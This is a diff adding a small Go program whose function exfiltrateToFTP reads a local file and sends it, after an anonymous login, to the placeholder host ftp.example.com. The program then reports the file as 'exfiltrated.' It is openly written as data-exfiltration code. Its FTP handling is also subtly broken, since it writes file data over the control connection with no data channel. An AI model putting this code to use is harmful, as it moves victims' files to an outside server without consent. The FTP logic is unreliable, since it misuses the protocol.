@@ -1,0 +1,37 @@
+package main
+
+import (
+    "fmt"
+    "io/ioutil"
+    "net"
+    "net/textproto"
+    "os"
+)
+
+func exfiltrateToFTP(server string, filename string) {
+    conn, err := net.Dial("tcp", server)
+    if err != nil {
+        fmt.Println("FTP connection error:", err)
+        return
+    }
+    defer conn.Close()
+
+    tp := textproto.NewConn(conn)
+    tp.PrintfLine("USER anonymous")
+    tp.PrintfLine("PASS anonymous")
+
+    data, err := ioutil.ReadFile(filename)
+    if err != nil {
+        fmt.Println("File read error:", err)
+        return
+    }
+
+    tp.PrintfLine("STOR %s", filename)
+    tp.DotWriter().Write(data)
+    tp.PrintfLine("QUIT")
+}
+
+func main() {
+    exfiltrateToFTP("ftp.example.com:21", "/path/to/file")
+    fmt.Println("File exfiltrated to FTP.")
+}
